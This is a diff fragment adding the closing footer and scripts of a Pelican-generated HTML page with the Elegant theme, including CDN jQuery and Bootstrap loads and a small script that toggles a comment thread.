+        Theme: <a href="https://elegant.oncrashreboot.com/" title="Theme Elegant Home Page" target="_blank" rel="nofollow noopener noreferrer">Elegant</a>
+    </div>
+</footer>            <script src="//code.jquery.com/jquery.min.js"></script>
+        <script src="//netdna.bootstrapcdn.com/twitter-bootstrap/2.3.2/js/bootstrap.min.js"></script>
+        <script src="./theme/js/elegant.prod.9e9d5ce754.js"></script>
+        <script>
+            function validateForm(query)
+            {
+                return (query.length > 0);
+            }
+        </script>
+
+    <script>
+    (function () {
+        if (window.location.hash.match(/^#comment-\d+$/)) {
+            $('#comment_thread').collapse('show');
+        }
+    })();
+    window.onhashchange=function(){
+        if (window.location.hash.match(/^#comment-\d+$/))
+            window.location.reload(true);
+    }
+    $('#comment_thread').on('shown', function () {
+        var link = document.getElementById('comment-accordion-toggle');
+        var old_innerHTML = link.innerHTML;
+        $(link).fadeOut(200, function() {
+            $(this).text('Click here to hide comments').fadeIn(200);
+        });
+        $('#comment_thread').on('hidden', function () {
+            $(link).fadeOut(200, function() {
+                $(this).text(old_innerHTML).fadeIn(200);
+            });
+        })
+    })
+</script>
+
+    </body>
+    <!-- Theme: Elegant built for Pelican
+        License : MIT -->
+</html>
